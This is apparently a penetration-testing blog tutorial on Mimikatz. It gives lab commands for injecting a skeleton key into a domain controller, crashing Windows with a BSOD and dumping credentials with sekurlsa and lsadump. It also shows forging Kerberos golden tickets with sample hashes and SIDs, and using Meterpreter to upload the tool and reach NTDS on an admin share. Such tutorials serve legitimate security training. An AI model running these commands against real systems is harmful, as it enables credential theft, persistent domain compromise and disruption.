<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/penetration-testing/" rel="category tag">Penetration Testing</a></span>            </div>
            <h1 class="post-title entry-title">Understanding Guide to Mimikatz</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/understanding-guide-mimikatz/" rel="bookmark"><time class="entry-date published" datetime="2018-02-28T07:31:03+00:00">February 28, 2018</time><time class="updated" datetime="2025-05-13T08:17:54+00:00">May 13, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <h3><span style="color: #800000;"><strong>What is Mimikatz?</strong></span></h3>
<p><span style="color: #000000;">Mimikatz is a Tool made in C Language by <a style="color: #000000;" href="https://twitter.com/gentilkiwi?lang=en">Benjamin Delpy</a>. It is a great tool to extract plain text passwords, hashes and Kerberos Tickets from Memory. It can also be used to generate Golden Tickets.</span></p>
<p><span style="color: #000000;">You can get Mimikatz In ZIP from <a style="color: #000000;" href="https://github.com/gentilkiwi/mimikatz/releases"><strong><span style="color: #0000ff;">here</span></strong></a><strong><u>. </u></strong>Or you can build it for git from <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://github.com/gentilkiwi/mimikatz"><strong>here</strong></a></span><strong><u>.</u></strong></span></p>
<p><span style="color: #000000;">Mimikatz comes in 2 architectures: x32 and x64. Here is a screenshot of the x64 mimikatz bash.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-VWIr8WnIw0o/WpZSuzrq7LI/AAAAAAAAU6o/zVWIhe0BPRQZqdyo_s-wfL1_7_qNeuCbACEwYBhgL/s1600/1.png"/></span></p>
<h3><span style="color: #800000;"><strong>Generate Skeleton Key with Mimikatz</strong></span></h3>
<p><span style="color: #000000;"><strong>Victim: Windows Server 2012 R2 (Domain Controller)</strong></span></p>
<p><span style="color: #000000;"><strong>Attacker: Mimikatz (On Windows Server 2012 R2)</strong></span></p>
<p><span style="color: #000000;">In this attack, what mimikatz installs the patch on the Domain Controller to accept “mimikatz” as a new login password? It can be thought as a <strong>Master Key </strong>which will open the Active Directory to the attacker. This attack can be performed as shown below.</span></p>
<p><span style="color: #000000;">First, I will try to login on my Server using mimikatz as a password.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-sVLUiDvlc34/WpZSzAEUfkI/AAAAAAAAU8o/55eb8_24Hu43NdkCdXMcjMnHmEUXIMWJQCEwYBhgL/s1600/2.png"/></span></p>
<p><span style="color: #000000;">As you can see clearly that we cannot login into the server using ‘mimikatz’ as a password.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-9OL5vZnKntM/WpZS277V4_I/AAAAAAAAU8o/Mws8dRoEQnYk6IhU627huRqYynZJWSzoQCEwYBhgL/s1600/3.png"/></span></p>
<p><span style="color: #000000;">Now I will log in the server using its password which is ‘T00r’.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-QJ6FqO_gzxw/WpZS4CenZwI/AAAAAAAAU8o/fKIoa9CeuZMAKOEld6kYxvZ3mcerUgBkgCEwYBhgL/s1600/4.png"/></span></p>
<p><span style="color: #000000;">And as you can see below I have logged in the Server using the correct password</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-n3REK5QoR2Q/WpZS4rB70cI/AAAAAAAAU8o/-W7CcXYqRG0oQN6OBCP3r7Lt7EHOeDsFACEwYBhgL/s1600/5.png"/></span></p>
<p><span style="color: #000000;">If you ever are logged in on a server or have a server unlocked, you can create a skeleton key to be stored inside the memory of the Server by using Mimikatz.</span></p>
<p><span style="color: #000000;">Launch the Mimikatz Terminal according to the architecture of the server (x32, x64). Now first we will get the debugging privilege in Mimikatz using</span></p>
<pre class="lang:default decode:true">privilege::debug</pre>
<p><span style="color: #000000;">And then we will inject the mimikatz skeleton key in the memory of server using</span></p>
<pre class="lang:default decode:true">misc::skeleton</pre>
<p><span style="color: #000000;">With this, we have our skeleton key successfully injected on the server.</span></p>
<p><span style="color: #000000;"><strong>Note:</strong> You will have to open mimikatz with Administrative Privilege to create a Skeleton Key.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-Zez-F9nYPmM/WpZS5mFT_FI/AAAAAAAAU8g/4qh6pmogJmg2-GuAjEyfBq11NZOiOaf6wCEwYBhgL/s1600/6.png"/></span></p>
<p><span style="color: #000000;">Now I will try to login the server using the skeleton key “mimikatz” we just injected in the memory. Remember last time we tried to log in the server using mimikatz as a password we were unsuccessful.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-VFfBZ6dldlI/WpZS6LhQsMI/AAAAAAAAU8o/Yc-tkv-3Ye08uDq4_-cGRo6cLaMtn8SCgCEwYBhgL/s1600/7.png"/></span></p>
<p><span style="color: #000000;">But this time ‘mimikatz’ was accepted as a password. This does not mean that we reset the original password ‘T00r’. The server will continue to log in using ‘T00r’ but now it will also accept ‘mimikatz’ as a password too.</span></p>
<p><span style="color: #000000;">Now, remember that we injected the skeleton key in the memory, not in storage so the next time that admin restarts the server we will lose the access. So the best way to protect your Domain Controller from Skeleton Key is a practice of restarting the Server Frequently or prevents mimikatz from accessing the memory.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-ooHAMNmdBRA/WpZS6KrgcKI/AAAAAAAAU8k/lD6K7gsJXTAjENZv9GMtcbdK7cQ7p7HiQCEwYBhgL/s1600/8.png"/></span></p>
<h3><span style="color: #800000;"><strong>Blue Screen of Death (BSOD) with Mimikatz</strong></span></h3>
<p><span style="color: #000000;"><strong>Attacker: Mimikatz (on Windows 7)</strong></span></p>
<p><span style="color: #000000;"><strong>Victim: Windows 7</strong></span></p>
<p><span style="color: #000000;">We can perform a Blue Screen of Death or BSOD attack using mimikatz. This shows how powerful this tool is.  To perform the BSOD on a System follow the steps mentioned below:</span></p>
<ul>
<li><span style="color: #000000;">Run mimikatz with <strong>Administrator </strong></span></li>
<li><span style="color: #000000;">Start mimidrv service</span></li>
</ul>
<pre class="lang:default decode:true">!+
</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-iAd5ej8h0bE/WpZS6mqzrHI/AAAAAAAAU8s/IUmkAYxI4e0wBqojLYCJIwpLoFGnMZbswCEwYBhgL/s1600/9.png"/></span></p>
<p><span style="color: #000000;">Now Initiate the BSOD as given below in the following command.</span></p>
<pre class="lang:default decode:true">!bsod</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-hTWyiZk4A1g/WpZSuIJydoI/AAAAAAAAU8c/5vcboyu_pcwlzTfCKvQqYy1LsxQklJHxwCEwYBhgL/s1600/10.png"/></span></p>
<p><span style="color: #000000;">As you can see below we have the Blue Screen of Death Error</span></p>
<p><span style="color: #000000;"><strong>Note:</strong> This attack can corrupt data and <strong>potentially harm the system</strong>. Use Carefully !!</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-M38oi7H37wk/WpZSuV4R9vI/AAAAAAAAU8k/ySDmeH_ZaPYnwzfrlvlbzgG9an5It25eACEwYBhgL/s1600/11.png"/></span></p>
<h3><span style="color: #800000;"><strong>Display Hostname </strong></span></h3>
<p><span style="color: #000000;">You can extract hostname of the Victim System by typing hostname in the mimikatz Terminal.</span></p>
<pre class="lang:default decode:true">hostname</pre>
<p><span style="color: #000000;">We have extracted the hostname of the system as <strong>Pavan-pc</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-hfU94I-mOJA/WpZSvefVJdI/AAAAAAAAU8c/U1D1kbKxDcoVqrnhjrOIzCZ1fqJLOmOggCEwYBhgL/s1600/13.png"/></span></p>
<h3><span style="color: #800000;"><strong>Golden Ticket Generation with Mimikatz</strong></span></h3>
<p><span style="color: #000000;"><strong>Attacker: Mimikatz on Windows Server 2012 R2</strong></span></p>
<p><span style="color: #000000;"><strong>Victim: Windows Server 2012 R2</strong></span></p>
<p><span style="color: #000000;">To Generate a Golden Ticket, we will require the following information:</span></p>
<ol>
<li><span style="color: #000000;">Domain</span></li>
<li><span style="color: #000000;">SID</span></li>
<li><span style="color: #000000;">NTLM Hash</span></li>
</ol>
<p><span style="color: #000000;">Let’s get the Domain First.</span></p>
<p><span style="color: #000000;">To get the Domain we will run the <strong>ipconfig /all</strong> from the Command Line or PowerShell</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-s6PDFhJjIbw/WpZSvEY7n1I/AAAAAAAAU8k/uOg3ztG9YAEyGTj1-yPwKogXHTBtgsOkgCEwYBhgL/s1600/14.png"/></span></p>
<ul>
<li><span style="color: #000000;">Domain on my Server is Pavan.local</span></li>
<li><span style="color: #000000;">Now to get SID we will use whoami /user command as shown in given below image.</span></li>
</ul>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-UnN3lVErjpk/WpZSwh8DETI/AAAAAAAAU8k/ExxEnxexFgQy3AWqIouuJbe5H9btrW9tACEwYBhgL/s1600/15.png"/></span></p>
<p><span style="color: #000000;">Now we will mimikatz itself to extract the NTLM hash required to generate the Ticket.</span></p>
<p><span style="color: #000000;">First, we will get the Debugging Privilege using the following command given below.</span></p>
<pre class="lang:default decode:true">privilege::debug</pre>
<p><span style="color: #000000;">And now to extract hashes we will run following command given below.</span></p>
<pre class="lang:default decode:true">sekurlsa::logonpasswords</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-otAZ22PIBvA/WpZSwg6WwjI/AAAAAAAAU8g/xC-5hyZ9a7UfqYZ1F8qIdQme0ijyn-YVgCEwYBhgL/s1600/16.png"/></span></p>
<p><span style="color: #000000;">And now we have it all that we need to generate the Ticket.</span></p>
<p><span style="color: #000000;"><strong>Syntax:</strong> Kerberos::golden /domain:[Domain] /sid:[SID] /rc4:[NTLM Hash] /user:[Username To Create] /id:500 /ptt</span></p>
<pre class="lang:default decode:true">kerberos::golden /domain:PAVAN.LOCAL /sid:S-1-5-21-1118594253-693012904-2765600535 /rc4:9a7a6f22651d6a0fcc6e6a0c723c9cb0 /user:hacker /id:500 /ptt
</pre>
<p><span style="color: #000000;">Here I am creating the golden key for a user named ‘<strong>hacker</strong>’; you can use any of the existing users of the Domain or create a new one.</span></p>
<p><span style="color: #000000;">I am using the [/ppt] option to pass the ticket in the current session.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-2A5FIWbGEW4/WpZSxdmR9KI/AAAAAAAAU8c/8Ogt71AoyPkZqtAnU7x6xIvoqlle7_PlgCEwYBhgL/s1600/17.png"/></span></p>
<p><span style="color: #000000;">Now run the command prompt to the access of Share Folder and execute given below command:</span></p>
<pre class="lang:default decode:true">pushd \\WINSERVER01\c$</pre>
<p><span style="color: #000000;">Now we are in Z: drive execute given below command for NT directory services</span></p>
<pre class="lang:default decode:true">cd WINDOWS\NTDS
DIR</pre>
<p><span style="color: #000000;">As you can see that we get the access to the shared folder which cannot be accessed without Admin Access but we had obtained it without using CMD as administrator. From given below image you can observe that it is showing 8 files and 2 folders.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-DhfnoXm6hZ0/WpZSySmwsEI/AAAAAAAAU8k/2OPOy2chcVg1CzxCTzaEEcGLyso2DdkDQCEwYBhgL/s1600/18.png"/></span></p>
<h3><span style="color: #800000;"><strong>Remotely Generating Golden Ticket</strong></span></h3>
<p><span style="color: #000000;"><strong>Attacker: Kali</strong></span></p>
<p><span style="color: #000000;"><strong>Victim: Windows Server 2012 R2</strong></span></p>
<p><span style="color: #000000;">Firstly get a Meterpreter Access of the Server which you can learn from <a style="color: #000000;" href="http://www.hackingarticles.in/msfvenom-tutorials-beginners/"><strong>here</strong></a></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-U-KgF2YzMTE/WpZSyccgHAI/AAAAAAAAU8o/mWGt1XBGglIV6_N3F9spewAtI0pnmZe0gCEwYBhgL/s1600/19.png"/></span></p>
<p><span style="color: #000000;">Once gaining the meterpreter upload the mimikatz folder to the victim system using the command</span></p>
<pre class="lang:default decode:true">upload -r /root/Desktop/mimi c:\</pre>
<p><span style="color: #000000;">Remember to <strong>use -r</strong> so that upload command uploads recursively.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-zX8jW_RqRls/WpZSzLKliJI/AAAAAAAAU8g/CdxIRXlmtBk_ZclfqBlhIUrrmNWeiHYuQCEwYBhgL/s1600/20.png"/></span></p>
<p><span style="color: #000000;">Open the shell and extract Domain using <strong>ipconfig /all</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-4t6WasIs-jQ/WpZSzX5dIYI/AAAAAAAAU8s/DqbBRmk9SJ0YmF5ljLQi4WldiI0Kcl5QACEwYBhgL/s1600/21.png"/></span></p>
<p><span style="color: #000000;">And SID using the <strong>whoami /user</strong></span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-bxGPorIyyNE/WpZSz-IW5_I/AAAAAAAAU8k/WR4Y12WkN88371LMKclH5afsUsZW4DrbQCEwYBhgL/s1600/22.png"/></span></p>
<p><span style="color: #000000;">Now go to the location where we uploaded the mimikatz earlier and run <strong>mimikatz.exe</strong> as shown below</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-9mPTxarRTSc/WpZS0OBInnI/AAAAAAAAU8g/bk117ZjtphUadVMv6XHLwlORjwDB_HzhgCEwYBhgL/s1600/23.png"/></span></p>
<p><span style="color: #000000;">Now let’s extract the <strong>krbtgt NTLM hash</strong> using the following command</span></p>
<pre class="lang:default decode:true">lsadump::lsa /inject /name:krbtgt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-6-itKjsr0qg/WpZS0Uq12jI/AAAAAAAAU8g/0MAIuAP_rJUJDg_DPcEEJ3XxkMEZoaazACEwYBhgL/s1600/24.png"/></span></p>
<p><span style="color: #000000;">Now using all the information extracted let’s generate a golden ticket in the same way we did above.</span></p>
<pre class="lang:default decode:true">kerberos::golden /domain:pavan.loc /sid:S-1-5-21-97841242-3460736137-492355079 /rc4:e847d2e54044172830e3e3a6b8438853 /user:Hacker /id:500 /ptt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-JJH5yPfF3fg/WpZS1P9PFJI/AAAAAAAAU8s/259WoNGGqzIDOJ9eRyjLkiv48YZneCtIQCEwYBhgL/s1600/25.png"/></span></p>
<p><span style="color: #000000;">Now let’s take the access of Share Folder and as you can see that we get access to the shared folder which cannot be accessed without Admin Access.</span></p>
<p><span style="color: #000000;">Hence we successfully generated a golden ticket in a Windows Server Remotely via Kali</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-JJH5yPfF3fg/WpZS1P9PFJI/AAAAAAAAU8s/259WoNGGqzIDOJ9eRyjLkiv48YZneCtIQCEwYBhgL/s1600/25.png"/></span></p>
<p><span style="color: #000000;">Now let’s take the access of Share Folder and as you can see that we get access to the shared folder which cannot be accessed without Admin Access.</span></p>
<p><span style="color: #000000;">Hence we successfully generated a golden ticket in a Windows Server Remotely via Kali</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-fMXKmJXXVYM/WpZS1Yr9scI/AAAAAAAAU8s/UIHoCPj_FzU75nALEg62Ho30XcjbWFnUACEwYBhgL/s1600/26.png"/></span></p>
<h3><span style="color: #800000;"><strong>Hack the Minesweeper Game</strong></span></h3>
<p><span style="color: #000000;">We all have played Minesweeper Game, and it is tough to get all the mines right but those days of worry are over. To show that the Mimikatz is a powerful but a playful Tool, here I will hack the minesweeper game using Mimikatz.</span></p>
<p><span style="color: #000000;">Firstly open Mimikatz of your respective architecture.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-qDZfWm8xIkg/WpZS1RxOWxI/AAAAAAAAU8s/qnbPkLp3Yg4C7yd8uzi7dxaTY73FOLb8QCEwYBhgL/s1600/27.png"/></span></p>
<p><span style="color: #000000;">And then open the Minesweeper Game</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-nFv6rIzKZmU/WpZS2OHnHfI/AAAAAAAAU8o/tMrhkxq4ULkUv2hap4hSYRPIjTR_QFmewCEwYBhgL/s1600/28.png"/></span></p>
<p><span style="color: #000000;">To load minesweeper in the mimikatz by using</span></p>
<pre class="lang:default decode:true">minesweeper::infos
</pre>
<p><span style="color: #000000;">You can see in the above screenshot that the minesweeper grid is shown in the mimikatz shell.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-hYLVEEpLd8Q/WpZS2zXSleI/AAAAAAAAU8g/z7AWistQELYVfcHeorFcSmHH0__TGUSrwCEwYBhgL/s1600/29.png"/></span></p>
<p><span style="color: #000000;">Now click on any Random block on the minesweeper.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-29OXXzM217c/WpZS3LPvGlI/AAAAAAAAU8o/-B7AgBljWRwB_L7rjR3CLpnqzbzkBe3dwCEwYBhgL/s1600/30.png"/></span></p>
<p><span style="color: #000000;">Now run the previous command again and now we have locations of mine on the grid.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-0UW9UdU3XWQ/WpZS3-g4vcI/AAAAAAAAU8o/dIJqcC6JB64NxRSnwCqTFiA-z-N4rqdagCEwYBhgL/s1600/31.png"/></span></p>
<p><span style="color: #000000;">You can verify this image with the One with Mimikatz shell.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-ha0ZNWTSjjc/WpZS4JFDMdI/AAAAAAAAU8s/SykdPMatwIoUIME_owai13qrcAzv1P-FACEwYBhgL/s1600/32.png"/></span></p>
<p><span style="color: #000000;"><strong>Author: Pavandeep Singh</strong> is a Technical Writer, Researcher and Penetration Tester Contact <a style="color: #000000;" href="https://www.linkedin.com/in/pavandeep-singh-6b1074132"><strong>here</strong></a></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
